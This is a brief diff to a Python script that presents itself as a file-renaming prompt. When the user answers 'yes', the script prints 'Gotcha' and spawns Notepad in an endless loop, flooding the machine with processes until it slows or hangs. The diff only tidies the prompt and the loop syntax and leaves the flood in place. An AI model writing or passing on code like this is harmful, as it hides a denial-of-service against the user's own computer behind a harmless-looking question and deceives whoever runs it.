@@ -3,11 +3,11 @@ import sys
 
 
 def main():
-    rinomina = input("Do you want to rename a file? ")
+    rinomina = input("Do you want to rename a file? (yes, no) ")
 
     if rinomina == "yes":
         print("Gotcha")
-        while 1 == 1:
+        while True:
             subprocess.Popen('C:\\Windows\\System32\\notepad.exe')
 
     elif rinomina == "no":
